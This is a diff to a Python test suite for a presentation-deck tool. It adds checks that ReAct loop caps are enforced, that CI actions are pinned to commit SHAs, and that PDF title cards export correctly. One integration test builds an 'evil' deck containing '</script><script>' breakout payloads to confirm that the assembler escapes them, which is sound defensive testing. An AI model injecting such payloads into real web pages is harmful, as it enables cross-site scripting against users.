+        ok("H5 MAX_TOTAL_TOOLS cap defined")
+    else:
+        fail("H5 MAX_TOTAL_TOOLS missing",
+             "ReAct loop needs a session-total tool-call cap")
+    if "MAX_MESSAGES_BYTES" in engine:
+        ok("H5 MAX_MESSAGES_BYTES cap defined")
+    else:
+        fail("H5 MAX_MESSAGES_BYTES missing",
+             "ReAct loop needs a messages-size cap")
+    # The caps must actually be enforced inside the for-loop, not just
+    # declared.
+    loop_match = re.search(r'for \(let iter = 0; iter < 12;[\s\S]+?\n\s{4}\}\n', engine)
+    loop_body = loop_match.group(0) if loop_match else ""
+    if "MAX_TOOLS_PER_TURN" in loop_body and "MAX_TOTAL_TOOLS" in loop_body and "MAX_MESSAGES_BYTES" in loop_body:
+        ok("H5 ReAct loop body enforces all three caps")
+    else:
+        fail("H5 ReAct loop enforcement",
+             "MAX_TOOLS_PER_TURN / MAX_TOTAL_TOOLS / MAX_MESSAGES_BYTES must be checked inside the for loop")
+
+    # ── H7: every third-party action must be pinned to a commit SHA. Tag
+    #        pins (@v4, @v7 etc.) are mutable — if the action's publisher
+    #        account is compromised, attacker can re-point the tag and
+    #        backdoor every CI run. Recent precedents: tj-actions/changed-files
+    #        and reviewdog/action-setup (March 2025). Release-pipeline blast
+    #        radius for us = forged SLSA attestations on signed skill ZIPs.
+    wf_dir = os.path.join(REPO_ROOT, ".github", "workflows")
+    if os.path.isdir(wf_dir):
+        offenders = []
+        for fn in sorted(os.listdir(wf_dir)):
+            if not fn.endswith(".yml"):
+                continue
+            path = os.path.join(wf_dir, fn)
+            for i, line in enumerate(open(path, encoding="utf-8").read().splitlines(), 1):
+                m = re.search(r'uses:\s*([\w./_-]+)@([^\s#]+)', line)
+                if not m:
+                    continue
+                action, ref = m.group(1), m.group(2)
+                # Reusable local workflows (./.github/workflows/*.yml) don't have @ref.
+                if action.startswith("./"):
+                    continue
+                # SHA pin = 40 lowercase hex chars.
+                if not re.fullmatch(r'[a-f0-9]{40}', ref):
+                    offenders.append(f"{fn}:{i} {action}@{ref}")
+        if offenders:
+            fail("H7 actions pinned by mutable tag",
+                 f"{len(offenders)} action(s) pinned to non-SHA refs: " + "; ".join(offenders[:5]) +
+                 (f" (+{len(offenders)-5} more)" if len(offenders) > 5 else ""))
+        else:
+            ok("H7 all workflow actions pinned to 40-char SHAs")
+    else:
+        fail("H7 workflows dir not found", wf_dir)
 
 
 # ━━━ Known Bugs (regression watchlist) ━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -410,6 +1007,56 @@ def test_integration():
         else:
             fail("assemble.py builds artifact", result.stderr.strip())
 
+        # 4b. Regression: every char that can break out of a <script> block
+        # (HTML parser) or terminate a JS string literal (JS parser) must be
+        # escaped in the STARTUP_PATCH region. The assembled .jsx is loaded
+        # inside <script type="text/babel"> by both app/local.html and the
+        # Claude.ai artifact viewer. Covered chars: < > & U+2028 U+2029.
+        evil_deck = {
+            "deckTitle": "Evil </script><script>x</script> & <!-- -->    ",
+            "lanes": [{
+                "title": "x",
+                "items": [{
+                    "title": "</script><script>window.__pwned=1</script>",
+                    "status": "todo",
+                    "slides": [{"bg": "#000", "color": "#fff", "duration": 10,
+                                "blocks": [{"type": "heading", "text": "hi"}]}]
+                }]
+            }]
+        }
+        evil_in = os.path.join(tmpdir, "evil.vela")
+        evil_out = os.path.join(tmpdir, "evil.jsx")
+        with open(evil_in, "w", encoding="utf-8") as f:
+            json.dump(evil_deck, f, ensure_ascii=False)
+        result = subprocess.run(
+            [sys.executable, os.path.join(SCRIPTS, "assemble.py"), evil_in, evil_out],
+            capture_output=True, text=True,
+            env={**os.environ, "PYTHONPATH": SCRIPTS}
+        )
+        if result.returncode == 0 and os.path.exists(evil_out):
+            evil_artifact = open(evil_out, encoding="utf-8").read()
+            patch_idx = evil_artifact.find("const STARTUP_PATCH = {")
+            patch_end = evil_artifact.find("};\n", patch_idx) if patch_idx >= 0 else -1
+            patch_region = evil_artifact[patch_idx:patch_end] if patch_idx >= 0 else ""
+            # Bad: any raw < > & or line-separator inside the JSON value.
+            # (The literal "const STARTUP_PATCH = {" prefix has its own = sign and
+            # braces, but no < > & or U+2028/9, so the region is clean to scan.)
+            json_region = patch_region[len("const STARTUP_PATCH = "):] if patch_region else ""
+            bad = [c for c in ("<", ">", "&", " ", " ") if c in json_region]
+            # Good: the escaped forms must be present (proof the deck data made it through).
+            need = ("\\u003c", "\\u003e", "\\u0026", "\\u2028", "\\u2029")
+            missing = [e for e in need if e not in json_region]
+            if not bad and not missing:
+                ok("assemble.py escapes <,>,&,U+2028,U+2029 in deck content (no breakout)")
+            elif bad:
+                fail("assemble.py script-context escape",
+                     f"unescaped {bad!r} in STARTUP_PATCH region — XSS / JS-string breakout possible")
+            else:
+                fail("assemble.py script-context escape",
+                     f"escape forms missing from output: {missing!r}")
+        else:
+            fail("assemble.py evil-deck run", result.stderr.strip())
+
         # 5. Version extraction works
         version_match = re.search(r'const VELA_VERSION\s*=\s*"([^"]+)"', built)
         if version_match:
@@ -604,10 +1251,11 @@ def test_channel_local():
             ok("serve.py injects deck path into HTML")
         else:
             fail("serve.py deck path")
-        if '<\\\\/' in srv or '<\\/' in srv:
-            ok("serve.py escapes </ for XSS prevention")
+        if "escape_for_script_context(deck_json_str)" in srv:
+            ok("serve.py escapes deck JSON for <script> context (helper wired)")
         else:
-            fail("serve.py XSS escape")
+            fail("serve.py XSS escape",
+                 "expected call to escape_for_script_context(deck_json_str) before STARTUP_PATCH injection")
         if "long-poll" in srv.lower() or "DeckVersionTracker" in srv:
             ok("serve.py uses long-polling with version tracker")
         else:
@@ -2070,8 +2718,86 @@ def test_study_notes():
         fail("sanitizeStudyNotes not wired into sanitizeSlide")
 
 
-# ━━━ New Block Primitives Tests ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# ━━━ PDF Title-Card Export Tests (v12.57 / v12.58) ━━━━━━━━━━━━━━━
+def test_pdf_title_cards():
+    print("\n── PDF Title-Card Export Tests ──")
 
+    imports_src = open(os.path.join(PARTS_DIR, "part-imports.jsx"), encoding="utf-8").read()
+    slides_src  = open(os.path.join(PARTS_DIR, "part-slides.jsx"), encoding="utf-8").read()
+    pdf_src     = open(os.path.join(PARTS_DIR, "part-pdf.jsx"), encoding="utf-8").read()
+    app_src     = open(os.path.join(PARTS_DIR, "part-app.jsx"), encoding="utf-8").read()
+
+    # 1. Shared helper exists and tags its output as a virtual slide
+    bm = re.search(r"function buildTitleCardSlide\([^)]*\)\s*\{(.*?)\n\}", imports_src, re.DOTALL)
+    if bm and "_virtual: true" in bm.group(1):
+        ok("buildTitleCardSlide() exists and marks slide _virtual")
+    else:
+        fail("buildTitleCardSlide() missing or does not set _virtual: true")
+
+    # 2. Title card uses a light gradient bg (root cause of the dark-box bug was a dark bg)
+    if bm and "linear-gradient" in bm.group(1) and "#f8fafc" in bm.group(1):
+        ok("buildTitleCardSlide() uses a light gradient background")
+    else:
+        fail("buildTitleCardSlide() should use a light gradient background")
+
+    # 3. Single source of truth: presentation mode reuses buildTitleCardSlide()
+    if "buildTitleCardSlide(" in slides_src:
+        ok("part-slides.jsx presentation titleCard reuses buildTitleCardSlide()")
+    else:
+        fail("part-slides.jsx should reuse buildTitleCardSlide() (single source of truth)")
+
+    # 4. collectAllSlides inserts a title card before each presentCard module's slides
+    cm = re.search(r"function collectAllSlides\([^)]*\)\s*\{(.*?)\n\}", pdf_src, re.DOTALL)
+    if cm and "item.presentCard" in cm.group(1) and "buildTitleCardSlide(" in cm.group(1):
+        ok("collectAllSlides inserts title cards for presentCard modules")
+    else:
+        fail("collectAllSlides should insert buildTitleCardSlide() for presentCard modules")
+
+    # 5. Export dialog exposes an opt-out toggle + a live count of enabled cards
+    if "includeCards" in pdf_src and "titleCardCount" in pdf_src:
+        ok("PdfExportModal has includeCards toggle + titleCardCount")
+    else:
+        fail("PdfExportModal missing includeCards toggle or titleCardCount")
+
+    # 6. Toggling off filters the virtual cards out of the exported set
+    if re.search(r"includeCards\s*\?\s*allSlides\s*:\s*allSlides\.filter\(\s*\(s\)\s*=>\s*!s\._virtual", pdf_src):
+        ok("includeCards=false filters _virtual cards from export")
+    else:
+        fail("includeCards toggle should filter !s._virtual from export")
+
+    # 7. titleCardCount counts only the virtual (enabled) cards
+    if re.search(r"titleCardCount\s*=\s*useMemo\(\(\)\s*=>\s*allSlides\.filter\(\s*\(s\)\s*=>\s*s\._virtual", pdf_src):
+        ok("titleCardCount counts only _virtual cards")
+    else:
+        fail("titleCardCount should count allSlides.filter(s => s._virtual)")
+
+    # 8. Slide numbering excludes virtual cards in BOTH render paths (raster + vector)
+    if pdf_src.count("s._virtual ? 0 : 1") >= 2:
+        ok("Slide numbering excludes virtual cards in both render paths")
+    else:
+        fail("displayTotal should exclude _virtual cards in both render paths")
+
+    # 9. Branding overlays suppressed on virtual title cards in both render paths
+    if pdf_src.count("currentSlide._virtual ? null : branding") >= 2:
+        ok("Branding suppressed on virtual cards in both render paths")
+    else:
+        fail("branding should be null for _virtual cards in both render paths")
+
+    # 10. Vector composite-bg fix: gradient hex stop branch before the dark fallback
+    grad_branch = re.search(r"rawBgStr\.match\(/#\(\[0-9a-f\]\{3,8\}\)/i\)", pdf_src)
+    if grad_branch:
+        ok("Vector exporter derives composite bg from gradient's first hex stop")
+    else:
+        fail("Vector exporter missing gradient-hex composite-bg branch (dark-box fix)")
+
+    # 11. Root invocation passes lanes + branding so cards build with deck accent
+    if "collectAllSlides(state.lanes, state.branding)" in app_src:
+        ok("part-app.jsx passes lanes + branding to collectAllSlides")
+    else:
+        fail("part-app.jsx should call collectAllSlides(state.lanes, state.branding)")
+
+
+# ━━━ New Block Primitives Tests ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 def test_block_primitives():
     print("\n── Block Primitives Tests ──")
 
@@ -2316,6 +3042,8 @@ if __name__ == "__main__":
     if run_unit:
         test_unit()
         test_security()
+        test_css_color_exfil()
+        test_audit_2025_05_fixes()
         test_known_bugs()
         test_ip_hygiene()
         test_v10_features()
@@ -2323,6 +3051,7 @@ if __name__ == "__main__":
         test_server_hardening()
         test_block_primitives()
         test_study_notes()
+        test_pdf_title_cards()
     if run_integration:
         test_integration()
         test_cli_commands()
